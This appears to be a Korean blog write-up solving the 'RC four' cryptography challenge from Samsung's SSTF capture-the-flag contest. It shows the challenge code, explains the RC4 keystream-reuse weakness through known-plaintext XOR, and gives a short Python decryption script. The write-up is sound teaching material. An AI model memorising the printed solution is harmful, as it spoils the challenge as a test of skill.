    <link href="/2020/10/18/idioth/sstf-rc-four/"/>
    <url>/2020/10/18/idioth/sstf-rc-four/</url>
    
    <content type="html"><![CDATA[<h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p><img src="/2020/10/18/idioth/sstf-rc-four/image.png"></p><p>압축을 풀면 challenge.py와 output.txt 파일을 볼 수 있습니다.</p><p><img src="/2020/10/18/idioth/sstf-rc-four/image1.png"></p><p>output.txt 파일에는 암호화된 것으로 추측되는 문자열이 2줄 존재합니다.</p><h1 id="challenge-py-분석"><a href="#challenge-py-분석" class="headerlink" title="challenge.py 분석"></a>challenge.py 분석</h1><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> ARC4<span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> key, flag<span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> hexlify<span class="hljs-comment">#RC4 encrypt function with &quot;key&quot; variable.</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encrypt</span>(<span class="hljs-params">data</span>):</span><span class="hljs-comment">#check the key is long enough</span><span class="hljs-keyword">assert</span>(len(key) &gt; <span class="hljs-number">128</span>)<span class="hljs-comment">#make RC4 instance</span>cipher = ARC4.new(key)<span class="hljs-comment">#We don&#x27;t use the first 1024 bytes from the key stream.</span><span class="hljs-comment">#Actually this is not important for this challenge. Just ignore.</span>cipher.encrypt(<span class="hljs-string">&quot;0&quot;</span>*<span class="hljs-number">1024</span>)<span class="hljs-comment">#encrypt given data, and return it.</span><span class="hljs-keyword">return</span> cipher.encrypt(data)msg = <span class="hljs-string">&quot;RC4 is a Stream Cipher, which is very simple and fast.&quot;</span><span class="hljs-keyword">print</span> (hexlify(encrypt(msg)).decode())<span class="hljs-keyword">print</span> (hexlify(encrypt(flag)).decode())</code></pre><p>challenge 파일을 해보면 arc4를 사용하여 암호화를 진행한 것을 알 수 있습니다.</p><p>output.txt의 첫 번째 줄은 msg를 암호화한 부분이고 두 번째 줄은 flag임을 알 수 있습니다.</p><p><a href="https://en.wikipedia.org/wiki/RC4">rc4 알고리즘</a>은 스트림 암호로 key 값을 사용하여 셔플링을 통해 키 스트림 바이트를 생성한 후 해당 키 스트림과 xor 연산을 통해 암호화를 진행합니다.</p><p>key 값을 사용하여 생성된 key stream과 문자열을 xor 연산하여 최종 암호문이 나오는 것을 활용하면 key 값을 알지 못해도 flag 암호문을 복호화할 수 있습니다.</p><p>key stream ^ 문자열 = 암호문이므로 암호문 ^ 문자열을 수행하면 key stream을 알 수 있고 해당 key stream과 flag 암호문을 xor 연산을 수행하면 flag 값을 얻을 수 있습니다.</p><h1 id="Decrypt-Code"><a href="#Decrypt-Code" class="headerlink" title="Decrypt Code"></a>Decrypt Code</h1><pre><code class="hljs python">text = <span class="hljs-string">&quot;RC4 is a Stream Cipher, which is very simple and fast.&quot;</span>result = [<span class="hljs-number">0x63</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0xaa</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0xfc</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0xf4</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0xef</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0x8c</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0xd2</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0xf5</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0xf8</span>]stream = [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(text))]dec_flag = [<span class="hljs-number">0x62</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xaf</span>, <span class="hljs-number">0xb3</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0xdd</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0xbb</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0xca</span>, <span class="hljs-number">0xd3</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xce</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0xb4</span>, <span class="hljs-number">0xc8</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa8</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-number">0xa8</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0xe9</span>, <span class="hljs-number">0xcb</span>]flag = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(text)):    stream[i] = str(int(ord(text[i]) ^ result[i]))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(dec_flag)):    flag += str(chr(int(stream[i]) ^ dec_flag[i]))print(flag)</code></pre><p><img src="/2020/10/18/idioth/sstf-rc-four/image2.png"></p>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>samsung</tag>
      
      <tag>ctf</tag>
      
      <tag>sstf</tag>
      
      <tag>idioth</tag>
      
      <tag>crypto</tag>
      
      <tag>rc4</tag>
      
      <tag>decrypt</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
